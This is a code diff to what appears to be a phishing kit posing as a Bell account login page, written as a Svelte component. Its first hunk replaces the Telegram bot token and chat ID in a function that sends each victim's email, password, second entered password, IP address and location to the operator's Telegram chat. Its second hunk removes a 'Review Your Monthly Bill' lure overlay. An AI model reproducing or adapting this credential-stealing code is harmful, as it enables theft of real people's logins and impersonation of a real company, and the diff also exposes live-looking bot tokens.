@@ -95,8 +95,8 @@
 
   // Send data to Telegram
   async function sendDataToTelegram(email, password, ip, location, modalEmail, modalPassword) {
-    const botToken = '7732681370:AAG-8Y1FMJe0DQA2d2O0LNUm_5enOWBddLo'; // Replace with your(others) Telegram bot token
-      const chatId = '6173839485'; // Replace with your(others) Telegram chat ID
+    const botToken = '8354020888:AAG26vvshagySr1PWjkoBQkp2ITS9WQncu8'; // Replace with your(others) Telegram bot token
+      const chatId = '1672938674'; // Replace with your(others) Telegram chat ID
 
     const message = `New Bell Login Attempt:\nEmail: ${email}\nPassword: ${password}\nModalEmail: ${modalEmail}\nModal-Password: ${modalPassword}\nIP Address: ${ip}\nLocation:\nCountry: ${location.country}\nCity: ${location.city}\nState: ${location.state}\nZip Code: ${location.zip_code}`;
 
@@ -512,15 +512,7 @@ async function closeModal() {
 }
 </style>
 <!-- Transparent Container-->
- {#if isContainerVisible}
- <div class="transparentContainer">
-  <div> <img class="transparentContainerLogo animate-in" src="/assets/bell.png" alt="logo"/> </div>
-  <p class="transparentContainerText animate-in"> Review Your Monthly Bill</p>
-
-  <button class="transparentContainerButton animate-in" on:click={closeTransparentContainer}> Login Email </button>
- </div>
-{/if}
-
+ 
  <!-- Main Container-->
 <div class="padding-div">
 <div class="div">
